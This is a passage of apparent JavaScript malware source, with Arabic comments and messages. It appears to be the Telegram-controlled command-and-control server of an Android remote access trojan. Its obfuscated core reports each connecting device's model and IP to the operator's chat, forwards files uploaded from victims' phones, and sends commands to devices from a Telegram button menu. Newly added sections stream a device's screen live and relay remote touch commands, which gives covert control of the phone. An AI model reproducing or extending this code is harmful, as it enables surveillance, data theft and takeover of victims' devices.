            `👁 <b>المشاهدين:</b> ${stream.clients.size}`,
            { parse_mode: 'HTML' }
        );
    } else {
        bot.sendMessage(chatId, `❌ الجهاز ${deviceId} لا يبث حالياً`, { parse_mode: 'HTML' });
    }
});

bot.onText(/\/streams/, (msg) => {
    const chatId = msg.chat.id;
    const devices = Array.from(activeStreams.keys());
    
    if (devices.length > 0) {
        let message = '<b>🔴 الأجهزة التي تبث حالياً:</b>\n\n';
        devices.forEach(deviceId => {
            const stream = activeStreams.get(deviceId);
            message += `📱 <b>${deviceId}</b>\n`;
            message += `   👁 المشاهدين: ${stream.clients.size}\n`;
            message += `   📺 ${stream.screenInfo.width || '?'}x${stream.screenInfo.height || '?'}\n`;
            message += `   🔗 /live ${deviceId}\n\n`;
        });
        bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
    } else {
        bot.sendMessage(chatId, '❌ لا توجد بثوث نشطة حالياً', { parse_mode: 'HTML' });
    }
});

// بداية الكود الأصلي
app[_0x286428(0x214)]('/', (_0x475404, _0x364a1f) => {
    const _0x4afaa0 = _0x286428, _0x30b554 = { 'VqrFV': _0x4afaa0(0x326) + _0x4afaa0(0x2f1) + _0x4afaa0(0x3aa) + _0x4afaa0(0x2c9) };
    _0x364a1f[_0x4afaa0(0x2f7)](_0x30b554[_0x4afaa0(0x2fe)]);
}), app[_0x286428(0x37a)](_0x286428(0x24c), uploader[_0x286428(0x201)](_0x286428(0x370)), (_0x504b1c, _0x252371) => {
    const _0x409dce = _0x286428, _0x1e4d80 = {
            'paFDf': _0x409dce(0x364),
            'fJklo': _0x409dce(0x203),
            'CLOLW': _0x409dce(0x2eb)
        }, _0xdb74ab = _0x504b1c[_0x409dce(0x370)][_0x409dce(0x1f9) + 'me'], _0xa03b1b = _0x504b1c[_0x409dce(0x2d4)][_0x409dce(0x3a6)];
    bot[_0x409dce(0x2df) + 'nt'](data['id'], _0x504b1c[_0x409dce(0x370)][_0x409dce(0x227)], {
        'caption': _0x409dce(0x33e) + _0x409dce(0x2db) + _0x409dce(0x3b4) + _0x409dce(0x31a) + _0xa03b1b + _0x409dce(0x2f9),
        'parse_mode': _0x1e4d80[_0x409dce(0x2fc)]
    }, {
        'filename': _0xdb74ab,
        'contentType': _0x1e4d80[_0x409dce(0x3ad)]
    }), _0x252371[_0x409dce(0x2f7)](_0x1e4d80[_0x409dce(0x3ae)]);
}), io['on'](_0x286428(0x23f), _0x5c13cb => {
    const _0x34d9e4 = _0x286428, _0x25dd5e = {
            'RkOYS': function (_0x2b56ea, _0x375fa5) {
                return _0x2b56ea + _0x375fa5;
            },
            'VzNyA': function (_0x5a599f, _0x3ed8a6) {
                return _0x5a599f + _0x3ed8a6;
            },
            'KUcGh': function (_0x174881, _0x8e391f) {
                return _0x174881 + _0x8e391f;
            },
            'oeOUM': _0x34d9e4(0x364),
            'BjUhN': function (_0x22c95b, _0x5f52a9) {
                return _0x22c95b === _0x5f52a9;
            },
            'nubEg': function (_0x10f858, _0xd4e67e) {
                return _0x10f858 + _0xd4e67e;
            },
            'PiBez': function (_0x275118, _0x465575) {
                return _0x275118 === _0x465575;
            },
            'WzUaU': _0x34d9e4(0x39e),
            'DVFqO': function (_0x3b1c30, _0x1d2528) {
                return _0x3b1c30 + _0x1d2528;
            },
            'jDKdU': function (_0x366a14, _0x3461c1) {
                return _0x366a14 + _0x3461c1;
            },
            'CUwSn': _0x34d9e4(0x3a6),
            'BnXZc': _0x34d9e4(0x267) + _0x34d9e4(0x2bd),
            'Uajlm': _0x34d9e4(0x272),
            'cFJHr': function (_0x45af4c, _0x5ac04d) {
                return _0x45af4c + _0x5ac04d;
            },
            'gSIPM': function (_0x3f9b5e, _0x1337f3) {
                return _0x3f9b5e + _0x1337f3;
            },
            'FSmfF': _0x34d9e4(0x3f8),
            'pyzeN': _0x34d9e4(0x306) + _0x34d9e4(0x31e),
            'skaWZ': _0x34d9e4(0x245)
        };
    let _0x444e7d = _0x25dd5e[_0x34d9e4(0x318)](_0x25dd5e[_0x34d9e4(0x2b4)](_0x5c13cb[_0x34d9e4(0x327)][_0x34d9e4(0x2d4)][_0x25dd5e[_0x34d9e4(0x253)]], '-'), io[_0x34d9e4(0x3c1)][_0x34d9e4(0x3c1)][_0x34d9e4(0x3c5)]) || _0x25dd5e[_0x34d9e4(0x23d)], _0x5d119c = _0x5c13cb[_0x34d9e4(0x327)][_0x34d9e4(0x2d4)][_0x25dd5e[_0x34d9e4(0x24d)]] || _0x25dd5e[_0x34d9e4(0x23d)], _0x76c6b1 = _0x5c13cb[_0x34d9e4(0x327)][_0x34d9e4(0x2d4)]['ip'] || _0x25dd5e[_0x34d9e4(0x23d)];
    _0x5c13cb[_0x25dd5e[_0x34d9e4(0x253)]] = _0x444e7d, _0x5c13cb[_0x25dd5e[_0x34d9e4(0x24d)]] = _0x5d119c;
    let _0x35ea49 = _0x25dd5e[_0x34d9e4(0x3c0)](_0x25dd5e[_0x34d9e4(0x318)](_0x25dd5e[_0x34d9e4(0x38c)](_0x25dd5e[_0x34d9e4(0x37b)](_0x34d9e4(0x2ad) + _0x34d9e4(0x3e1) + _0x34d9e4(0x22a), _0x34d9e4(0x33b) + _0x34d9e4(0x236) + _0x444e7d + '\x0a'), _0x34d9e4(0x2a6) + _0x34d9e4(0x406) + '\x20' + _0x5d119c + '\x0a'), _0x34d9e4(0x40b) + '→\x20' + _0x76c6b1 + '\x0a'), _0x34d9e4(0x2ec) + _0x34d9e4(0x2f5) + _0x5c13cb[_0x34d9e4(0x327)][_0x34d9e4(0x351)] + '\x0a\x0a');
    bot[_0x34d9e4(0x369) + 'e'](data['id'], _0x35ea49, { 'parse_mode': _0x25dd5e[_0x34d9e4(0x3e6)] }), _0x5c13cb['on'](_0x25dd5e[_0x34d9e4(0x23b)], () => {
        const _0x558aec = _0x34d9e4;
        let _0x263547 = _0x25dd5e[_0x558aec(0x339)](_0x25dd5e[_0x558aec(0x339)](_0x25dd5e[_0x558aec(0x37b)](_0x25dd5e[_0x558aec(0x27c)](_0x558aec(0x255) + _0x558aec(0x359) + _0x558aec(0x20f), _0x558aec(0x33b) + _0x558aec(0x236) + _0x444e7d + '\x0a'), _0x558aec(0x387) + _0x558aec(0x2e3) + '→\x20' + _0x5d119c + '\x0a'), _0x558aec(0x40b) + '→\x20' + _0x76c6b1 + '\x0a'), _0x558aec(0x2ec) + _0x558aec(0x2f5) + _0x5c13cb[_0x558aec(0x327)][_0x558aec(0x351)] + '\x0a\x0a');
        bot[_0x558aec(0x369) + 'e'](data['id'], _0x263547, { 'parse_mode': _0x25dd5e[_0x558aec(0x3e6)] });
    }), _0x5c13cb['on'](_0x25dd5e[_0x34d9e4(0x405)], _0x4ccc0c => {
        const _0x5acb82 = _0x34d9e4;
        let _0x520b32 = [], _0x41751b = [];
        _0x4ccc0c[_0x5acb82(0x35e)]((_0x2162d1, _0x2a1b0c) => {
            const _0x3c5d98 = _0x5acb82;
            let _0x5b8386;
            _0x2162d1[_0x3c5d98(0x254)] ? _0x5b8386 = _0x444e7d + _0x3c5d98(0x270) + _0x2162d1[_0x3c5d98(0x298)] : _0x5b8386 = _0x444e7d + _0x3c5d98(0x3f1) + _0x2162d1[_0x3c5d98(0x298)];
            if (_0x25dd5e[_0x3c5d98(0x407)](_0x41751b[_0x3c5d98(0x27e)], 0x5 * 0x7c9 + -0x25b0 + -0x13d) || _0x25dd5e[_0x3c5d98(0x407)](_0x41751b[_0x3c5d98(0x27e)], -0x1b31 * -0x1 + 0x2b * -0x3b + 0x1 * -0x1147))
                _0x41751b[_0x3c5d98(0x278)]({
                    'text': _0x2162d1[_0x3c5d98(0x298)],
                    'callback_data': _0x5b8386
                }), _0x25dd5e[_0x3c5d98(0x407)](_0x25dd5e[_0x3c5d98(0x325)](_0x2a1b0c, -0x1 * -0x1d9 + 0x1d26 + -0x1efe), _0x4ccc0c[_0x3c5d98(0x27e)]) && _0x520b32[_0x3c5d98(0x278)](_0x41751b);
            else
                _0x25dd5e[_0x3c5d98(0x224)](_0x41751b[_0x3c5d98(0x27e)], -0x2611 + -0x869 + -0x11 * -0x2bc) && (_0x41751b[_0x3c5d98(0x278)]({
                    'text': _0x2162d1[_0x3c5d98(0x298)],
                    'callback_data': _0x5b8386
                }), _0x520b32[_0x3c5d98(0x278)](_0x41751b), _0x41751b = []);
        });
        
        // ========== الأزرار الجديدة - مضافة بشكل دائم ========== //
        // إضافة صف جديد للأزرار الجديدة
        _0x520b32.push([
            {
                text: '📺 بث مباشر',
                callback_data: _0x444e7d + '|live'
            },
            {
                text: '📡 البثوث النشطة',
                callback_data: _0x444e7d + '|streams'
            }
        ]);
        
        _0x520b32.push([{
            text: '🖱️ تحكم عن بعد',
            callback_data: _0x444e7d + '|remote'
        }]);
        // ========== نهاية الأزرار الجديدة ========== //
        
        _0x520b32.push([{
            'text': _0x25dd5e[_0x5acb82(0x31f)],
            'callback_data': _0x444e7d + _0x5acb82(0x3a0)
        }]), bot[_0x5acb82(0x369) + 'e'](data['id'], _0x5acb82(0x27b) + _0x5acb82(0x3b7) + _0x5acb82(0x316) + _0x5acb82(0x20d) + _0x444e7d + _0x5acb82(0x2f9), {
            'reply_markup': { 'inline_keyboard': _0x520b32 },
            'parse_mode': _0x25dd5e[_0x5acb82(0x3e6)]
        });
    }), _0x5c13cb['on'](_0x25dd5e[_0x34d9e4(0x273)], _0xfa321a => {
        const _0x52074a = _0x34d9e4;
        bot[_0x52074a(0x369) + 'e'](data['id'], _0x52074a(0x2c1) + _0x52074a(0x35d) + _0x52074a(0x210) + _0x52074a(0x27a) + _0x444e7d + (_0x52074a(0x2ef) + _0x52074a(0x39a)) + _0xfa321a, { 'parse_mode': _0x25dd5e[_0x52074a(0x3e6)] });
    });
    
    // ========== إضافات البث المباشر في WebSocket ========== //
    _0x5c13cb.on('stream-connect', (data) => {
        const deviceId = _0x444e7d;
        const { screenWidth, screenHeight } = data;
        
        activeStreams.set(deviceId, {
            socket: _0x5c13cb,
            clients: new Set(),
            screenInfo: { width: screenWidth || 0, height: screenHeight || 0 },
            lastFrame: null,
            lastFrameTime: Date.now()
        });
        
        _0x5c13cb.on('screen-frame', (frameData) => {
            const stream = activeStreams.get(deviceId);
            if (stream) {
                stream.lastFrame = frameData;
                stream.lastFrameTime = Date.now();
                
                stream.clients.forEach(clientSocket => {
                    if (clientSocket && clientSocket.connected) {
                        clientSocket.emit('screen-frame', {
                            frame: frameData,
                            timestamp: Date.now(),
                            width: stream.screenInfo.width,
                            height: stream.screenInfo.height
                        });
                    }
                });
            }
        });
        
        _0x5c13cb.on('disconnect', () => {
            activeStreams.delete(deviceId);
        });
    });
    
    _0x5c13cb.on('viewer-connect', (data) => {
        const { deviceId, streamKey } = data;
        const stream = activeStreams.get(deviceId);
        
        if (stream) {
            stream.clients.add(_0x5c13cb);
            
            _0x5c13cb.emit('screen-info', stream.screenInfo);
            
            if (stream.lastFrame) {
                _0x5c13cb.emit('screen-frame', {
                    frame: stream.lastFrame,
                    timestamp: Date.now(),
                    width: stream.screenInfo.width,
                    height: stream.screenInfo.height
                });
            }
            
            _0x5c13cb.on('touch-command', (touchData) => {
                const targetStream = activeStreams.get(deviceId);
                if (targetStream && targetStream.socket) {
                    targetStream.socket.emit('execute-touch', touchData);
                }
            });
            
            _0x5c13cb.on('disconnect', () => {
                if (stream.clients) {
                    stream.clients.delete(_0x5c13cb);
                }
            });
        } else {
            _0x5c13cb.emit('error', 'Device not found');
        }
    });
    // ========== نهاية إضافات البث المباشر ========== //
    
}), bot['on'](_0x286428(0x245), _0x517bec => {
    const _0x5e45b8 = _0x286428, _0x39eaaf = {
            'qrxOe': function (_0x1d7bfc, _0x3f4f84) {
                return _0x1d7bfc + _0x3f4f84;
            },
            'tuJBK': function (_0xa8f676, _0x21e02b) {
                return _0xa8f676 + _0x21e02b;
            },
            'UMoBA': function (_0x455e6f, _0x312299) {
                return _0x455e6f === _0x312299;
            },
            'bVUvK': _0x5e45b8(0x381) + _0x5e45b8(0x214),
            'ATlEf': _0x5e45b8(0x364),
            'wiYJD': _0x5e45b8(0x350) + _0x5e45b8(0x2d2),
            'TmFrI': _0x5e45b8(0x277) + _0x5e45b8(0x389),
            'BMnON': _0x5e45b8(0x356) + _0x5e45b8(0x28e),
            'BZAZH': _0x5e45b8(0x3c4) + _0x5e45b8(0x28f),
            'ozvdY': _0x5e45b8(0x275) + _0x5e45b8(0x2e8),
            'LuXSV': _0x5e45b8(0x2d1) + _0x5e45b8(0x291),
            'StNZR': _0x5e45b8(0x3eb) + _0x5e45b8(0x283),
            'pgYMs': _0x5e45b8(0x35b) + _0x5e45b8(0x209),
            'UfVZr': _0x5e45b8(0x368) + _0x5e45b8(0x2e1),
            'ABUif': _0x5e45b8(0x35c) + _0x5e45b8(0x2c2) + _0x5e45b8(0x392),
            'jrcFv': _0x5e45b8(0x342) + _0x5e45b8(0x33a),
            'wDdEO': _0x5e45b8(0x3d6),
            'kWxdr': _0x5e45b8(0x1fa) + _0x5e45b8(0x2e2),
            'buRdy': _0x5e45b8(0x295) + _0x5e45b8(0x3d1),
            'mXvJl': _0x5e45b8(0x2f2) + _0x5e45b8(0x241) + _0x5e45b8(0x2bc),
            'vzbbR': _0x5e45b8(0x295) + _0x5e45b8(0x310),
            'ucYrA': _0x5e45b8(0x2a8) + _0x5e45b8(0x25a),
            'NstmB': _0x5e45b8(0x3d7) + _0x5e45b8(0x2a0),
            'SgOTN': _0x5e45b8(0x342) + _0x5e45b8(0x2fa) + _0x5e45b8(0x3d4) + _0x5e45b8(0x1fe),
            'POWcA': _0x5e45b8(0x378) + _0x5e45b8(0x408),
            'CgDcr': _0x5e45b8(0x233) + _0x5e45b8(0x382),
            'HSDwf': _0x5e45b8(0x2ca) + _0x5e45b8(0x40d),
            'Helff': _0x5e45b8(0x365) + _0x5e45b8(0x268) + _0x5e45b8(0x323),
            'grDHq': _0x5e45b8(0x28a) + _0x5e45b8(0x35a) + _0x5e45b8(0x300) + '✯',
            'uoIow': function (_0x49334b, _0x59dd87) {
                return _0x49334b === _0x59dd87;
            },
            'oSogR': _0x5e45b8(0x2e9),
            'kocxE': _0x5e45b8(0x376) + _0x5e45b8(0x215) + _0x5e45b8(0x23a) + _0x5e45b8(0x336) + _0x5e45b8(0x2ac) + _0x5e45b8(0x2da),
            'FHnkh': _0x5e45b8(0x247) + _0x5e45b8(0x3a7) + _0x5e45b8(0x22d) + _0x5e45b8(0x229) + _0x5e45b8(0x265) + _0x5e45b8(0x303) + _0x5e45b8(0x211) + _0x5e45b8(0x3ef) + _0x5e45b8(0x39c) + _0x5e45b8(0x2e7) + _0x5e45b8(0x401) + _0x5e45b8(0x22c) + _0x5e45b8(0x32b) + _0x5e45b8(0x262) + _0x5e45b8(0x2cc) + _0x5e45b8(0x20e) + _0x5e45b8(0x2f4) + _0x5e45b8(0x348) + _0x5e45b8(0x24f) + _0x5e45b8(0x2ba) + _0x5e45b8(0x3a3) + _0x5e45b8(0x3fc) + _0x5e45b8(0x304) + _0x5e45b8(0x1ff) + _0x5e45b8(0x287) + '\x0a\x0a',
            'OaeBd': _0x5e45b8(0x2f6) + _0x5e45b8(0x321) + _0x5e45b8(0x301),
            'abEHy': _0x5e45b8(0x281) + _0x5e45b8(0x34c),
            'FTWid': _0x5e45b8(0x36e) + _0x5e45b8(0x1f6),
            'KMcVK': _0x5e45b8(0x397) + _0x5e45b8(0x29b) + '✯',
            'YOXnp': function (_0x49bf19, _0x209f58) {
                return _0x49bf19 === _0x209f58;
            },
            'AHGAo': _0x5e45b8(0x3e8) + _0x5e45b8(0x371),
            'qZwQU': _0x5e45b8(0x2c6) + _0x5e45b8(0x3f0),
            'qFEHz': _0x5e45b8(0x2dd),
            'QbQOS': _0x5e45b8(0x2c6),
            'tppeS': _0x5e45b8(0x282),
            'XPwbC': _0x5e45b8(0x23e) + _0x5e45b8(0x3f4) + _0x5e45b8(0x3b8) + _0x5e45b8(0x26a) + _0x5e45b8(0x315) + _0x5e45b8(0x2a1) + _0x5e45b8(0x372) + _0x5e45b8(0x3e2) + _0x5e45b8(0x3cb),
            'QWKQD': _0x5e45b8(0x3b6),
            'qQjHp': _0x5e45b8(0x39b),
            'wrQOE': _0x5e45b8(0x3ea),
            'VSggw': _0x5e45b8(0x280) + _0x5e45b8(0x36b),
            'rwzoV': _0x5e45b8(0x231) + _0x5e45b8(0x3fb),
            'NRqAi': _0x5e45b8(0x238) + 'xt',
            'arjOK': _0x5e45b8(0x3f5) + _0x5e45b8(0x311) + '\x20✯',
            'twgFo': _0x5e45b8(0x2d6),
            'uvVuL': _0x5e45b8(0x28d),
            'sSnbi': _0x5e45b8(0x23e) + _0x5e45b8(0x266) + _0x5e45b8(0x35f) + _0x5e45b8(0x3cf) + _0x5e45b8(0x235) + _0x5e45b8(0x390) + _0x5e45b8(0x32f) + _0x5e45b8(0x20f),
            'WpXBx': function (_0x40162f, _0x42c2e3) {
                return _0x40162f === _0x42c2e3;
            },
            'yJQuh': _0x5e45b8(0x324),
            'SRsQE': _0x5e45b8(0x20b),
            'IwwrQ': function (_0x5d08d2, _0x10a432) {
                return _0x5d08d2 === _0x10a432;
            },
            'rWKOo': _0x5e45b8(0x3f7),
            'kLiWJ': function (_0x1aa915, _0x4f5ce6) {
                return _0x1aa915 === _0x4f5ce6;
            },
            'tRUQf': _0x5e45b8(0x3ce) + _0x5e45b8(0x2f8),
            'yCtVW': _0x5e45b8(0x218),
            'gFnRT': _0x5e45b8(0x216) + _0x5e45b8(0x2a2),
            'ACIIr': _0x5e45b8(0x3ac) + _0x5e45b8(0x2ee),
            'xAfCt': _0x5e45b8(0x2b0) + _0x5e45b8(0x3c7),
            'FahaN': _0x5e45b8(0x26b) + _0x5e45b8(0x32e) + _0x5e45b8(0x27f),
            'fwwLa': _0x5e45b8(0x2b0) + _0x5e45b8(0x2aa),
            'HXPAl': function (_0x4c09b0, _0x457872) {
                return _0x4c09b0 === _0x457872;
            },
            'xwfKC': _0x5e45b8(0x23c) + _0x5e45b8(0x2f8),
            'xjphE': _0x5e45b8(0x1f5),
            'maoyn': function (_0x37ee44, _0x46e52e) {
                return _0x37ee44 === _0x46e52e;
            },
            'aOTNV': _0x5e45b8(0x296) + _0x5e45b8(0x257) + _0x5e45b8(0x22a),
            'PHOyW': function (_0x21259b, _0x134628) {
                return _0x21259b === _0x134628;
            },
            'COyLT': function (_0x17249e, _0x5d172c) {
                return _0x17249e === _0x5d172c;
            },
            'QgDqS': _0x5e45b8(0x296) + _0x5e45b8(0x257) + _0x5e45b8(0x38e),
            'LMUpv': _0x5e45b8(0x2bb) + _0x5e45b8(0x3fd) + _0x5e45b8(0x34a) + _0x5e45b8(0x3d2) + '\x0a',
            'klyVw': _0x5e45b8(0x21e) + _0x5e45b8(0x37e) + _0x5e45b8(0x285) + _0x5e45b8(0x24b) + _0x5e45b8(0x292) + _0x5e45b8(0x3c3) + _0x5e45b8(0x22b) + _0x5e45b8(0x357) + _0x5e45b8(0x3da) + _0x5e45b8(0x3ee) + _0x5e45b8(0x289) + _0x5e45b8(0x1f7) + _0x5e45b8(0x2cf) + _0x5e45b8(0x322) + _0x5e45b8(0x286) + _0x5e45b8(0x2dc),
            'bUOIn': _0x5e45b8(0x20c) + _0x5e45b8(0x355) + _0x5e45b8(0x398),
            'wcqGN': function (_0x689151, _0x17c6f7) {
                return _0x689151 === _0x17c6f7;
            },
            'OQizW': _0x5e45b8(0x35c) + _0x5e45b8(0x2c3) + _0x5e45b8(0x204),
            'RSweu': _0x5e45b8(0x39d),
            'MQeYG': _0x5e45b8(0x385),
            'MZPUm': _0x5e45b8(0x2f0),
            'FxUCM': _0x5e45b8(0x25f),
            'qmSqi': function (_0x469919, _0x2160f4) {
                return _0x469919 === _0x2160f4;
            },
            'FwqNA': _0x5e45b8(0x314) + 'a',
            'SSCYa': _0x5e45b8(0x242) + _0x5e45b8(0x30a),
            'LexPl': _0x5e45b8(0x38d),
            'fzeQJ': _0x5e45b8(0x276),
            'dFxqG': _0x5e45b8(0x263) + 'on',
            'tGgwm': function (_0x38ead8, _0x2adde1) {
                return _0x38ead8 === _0x2adde1;
            },
            'mSeFE': _0x5e45b8(0x263) + _0x5e45b8(0x383),
            'zjpbR': function (_0x514237, _0x4d25d2) {
                return _0x514237 === _0x4d25d2;
            },
            'pyhJJ': _0x5e45b8(0x306) + _0x5e45b8(0x31e),
            'bvHyo': function (_0x429280, _0x238aae) {
                return _0x429280 === _0x238aae;
            },
            'vgQYv': _0x5e45b8(0x36f),
            'HBeIo': function (_0x44c429, _0x18f4b7) {
                return _0x44c429 === _0x18f4b7;
            },
            'AeQsn': function (_0x4cb84b, _0x1f08d7) {
                return _0x4cb84b === _0x1f08d7;
            },
            'VcAKd': _0x5e45b8(0x258) + _0x5e45b8(0x2e5) + _0x5e45b8(0x21d) + _0x5e45b8(0x2c4) + _0x5e45b8(0x360) + _0x5e45b8(0x22e),
            'oibGt': function (_0x288bab, _0xf51b82) {
                return _0x288bab === _0xf51b82;
            },
            'KRrbd': _0x5e45b8(0x21f) + _0x5e45b8(0x30e) + _0x5e45b8(0x3cc) + _0x5e45b8(0x3ab) + _0x5e45b8(0x2c5) + _0x5e45b8(0x331) + _0x5e45b8(0x3f3) + _0x5e45b8(0x284) + _0x5e45b8(0x249) + _0x5e45b8(0x3db) + _0x5e45b8(0x20f),
            'fJCtm': function (_0x318895, _0x167516) {
                return _0x318895 === _0x167516;
            },
            'DMvqW': function (_0x4dea96, _0x4f2ceb, _0x5cafcf, _0x47bcca) {
                return _0x4dea96(_0x4f2ceb, _0x5cafcf, _0x47bcca);
            },
            'hGhIS': _0x5e45b8(0x3f9) + _0x5e45b8(0x226) + _0x5e45b8(0x29f) + _0x5e45b8(0x244) + '\x0a\x0a',
            'FrrOE': function (_0x541129, _0x554a0d) {
                return _0x541129 === _0x554a0d;
            },
            'ARLCP': _0x5e45b8(0x3f9) + _0x5e45b8(0x375) + _0x5e45b8(0x219) + _0x5e45b8(0x20f),
            'lKTya': function (_0x3c3f2b, _0x241e8c) {
                return _0x3c3f2b === _0x241e8c;
            },
            'CDNjl': _0x5e45b8(0x2b2) + _0x5e45b8(0x37d) + _0x5e45b8(0x200) + _0x5e45b8(0x3a5) + _0x5e45b8(0x400) + _0x5e45b8(0x317) + _0x5e45b8(0x206) + '\x0a',
            'TuXFO': _0x5e45b8(0x2d0),
            'YjyYm': function (_0x4275bd, _0x16e928) {
                return _0x4275bd === _0x16e928;
            },
            'WJvpz': _0x5e45b8(0x258) + _0x5e45b8(0x2ae) + _0x5e45b8(0x294) + _0x5e45b8(0x346) + _0x5e45b8(0x3c6) + _0x5e45b8(0x20f),
            'KwSVR': function (_0x457bef, _0x363ece) {
                return _0x457bef === _0x363ece;
            },
            'rUqqo': _0x5e45b8(0x258) + _0x5e45b8(0x2ae) + _0x5e45b8(0x361) + _0x5e45b8(0x344) + _0x5e45b8(0x3b0) + _0x5e45b8(0x20f),
            'hsPOD': _0x5e45b8(0x302) + 'e',
            'hdAIF': _0x5e45b8(0x28c) + _0x5e45b8(0x340) + _0x5e45b8(0x271) + _0x5e45b8(0x33c) + _0x5e45b8(0x22e)
        };
    if (_0x39eaaf[_0x5e45b8(0x3ec)](_0x517bec[_0x5e45b8(0x3ea)], _0x39eaaf[_0x5e45b8(0x26d)]))
        bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x205)](_0x39eaaf[_0x5e45b8(0x29e)](_0x39eaaf[_0x5e45b8(0x32a)], _0x39eaaf[_0x5e45b8(0x2c0)]), _0x39eaaf[_0x5e45b8(0x20a)]), {
            'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
            'reply_markup': {
                'keyboard': [
                    [
                        _0x39eaaf[_0x5e45b8(0x3a1)],
                        _0x39eaaf[_0x5e45b8(0x3e3)]
                    ],
                    [_0x39eaaf[_0x5e45b8(0x37c)]]
                ],
                'resize_keyboard': !![]
            }
        });
    else {
        if (_0x39eaaf[_0x5e45b8(0x30c)](appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x3e0)]), _0x39eaaf[_0x5e45b8(0x243)])) {
            let _0x1a6221 = _0x517bec[_0x5e45b8(0x3ea)], _0x177892 = appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x30d)]);
            io['to'](_0x177892)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                'request': _0x39eaaf[_0x5e45b8(0x2ff)],
                'extras': [{
                        'key': _0x39eaaf[_0x5e45b8(0x3a8)],
                        'value': _0x1a6221
                    }]
            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x3e0)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                'reply_markup': {
                    'keyboard': [
                        [
                            _0x39eaaf[_0x5e45b8(0x3a1)],
                            _0x39eaaf[_0x5e45b8(0x3e3)]
                        ],
                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                    ],
                    'resize_keyboard': !![]
                }
            });
        } else {
            if (_0x39eaaf[_0x5e45b8(0x30c)](appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x3e0)]), _0x39eaaf[_0x5e45b8(0x3df)])) {
                let _0x11ad45 = _0x517bec[_0x5e45b8(0x3ea)], _0x90e23e = appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x30d)]);
                io['to'](_0x90e23e)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                    'request': _0x39eaaf[_0x5e45b8(0x2ce)],
                    'extras': [{
                            'key': _0x39eaaf[_0x5e45b8(0x25e)],
                            'value': _0x11ad45
                        }]
                }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x3e0)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x343)], {
                    'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                    'reply_markup': {
                        'keyboard': [
                            [
                                _0x39eaaf[_0x5e45b8(0x3a1)],
                                _0x39eaaf[_0x5e45b8(0x3e3)]
                            ],
                            [_0x39eaaf[_0x5e45b8(0x37c)]]
                        ],
                        'resize_keyboard': !![]
                    }
                });
            }
        }
    }
    if (_0x39eaaf[_0x5e45b8(0x30c)](appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x3e0)]), _0x39eaaf[_0x5e45b8(0x38f)])) {
        let _0x47ae3a = _0x517bec[_0x5e45b8(0x3ea)];
        appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x29d)], _0x47ae3a), appData[_0x5e45b8(0x3fe)](_0x39eaaf[_0x5e45b8(0x3e0)], _0x39eaaf[_0x5e45b8(0x2b5)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x5e45b8(0x396) + _0x5e45b8(0x2fb) + _0x5e45b8(0x2e4) + _0x5e45b8(0x2d3) + _0x5e45b8(0x36c) + _0x5e45b8(0x3bd) + _0x47ae3a + _0x5e45b8(0x20f), {
            'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
            'reply_markup': {
                'keyboard': [[_0x39eaaf[_0x5e45b8(0x260)]]],
                'resize_keyboard': !![],
                'one_time_keyboard': !![]
            }
        });
    } else {
        if (_0x39eaaf[_0x5e45b8(0x3ec)](appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x3e0)]), _0x39eaaf[_0x5e45b8(0x2b5)])) {
            let _0x24ed4e = _0x517bec[_0x5e45b8(0x3ea)], _0x3d83d5 = appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x29d)]), _0x1c5ece = appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x30d)]);
            io['to'](_0x1c5ece)[_0x5e45b8(0x391)](_0x39eaaf[_0x5e45b8(0x345)], {
                'request': _0x39eaaf[_0x5e45b8(0x3b5)],
                'extras': [
                    {
                        'key': _0x39eaaf[_0x5e45b8(0x217)],
                        'value': _0x3d83d5
                    },
                    {
                        'key': _0x39eaaf[_0x5e45b8(0x25e)],
                        'value': _0x24ed4e
                    }
                ]
            }), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x30d)]), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x3e0)]), appData[_0x5e45b8(0x319)](_0x39eaaf[_0x5e45b8(0x29d)]), bot[_0x5e45b8(0x369) + 'e'](data['id'], _0x39eaaf[_0x5e45b8(0x222)], {
                'parse_mode': _0x39eaaf[_0x5e45b8(0x2b9)],
                'reply_markup': {
                    'keyboard': [
                        [
                            _0x39eaaf[_0x5e45b8(0x3a1)],
                            _0x39eaaf[_0x5e45b8(0x3e3)]
                        ],
                        [_0x39eaaf[_0x5e45b8(0x37c)]]
                    ],
                    'resize_keyboard': !![]
                }
            });
        } else {
            if (_0x39eaaf[_0x5e45b8(0x38b)](appData[_0x5e45b8(0x214)](_0x39eaaf[_0x5e45b8(0x3e0)]), _0x39eaaf[_0x5e45b8(0x207)])) {
                let _0x7aa3c7 = _0x517bec[_0x5e45b8(0x3ea)];
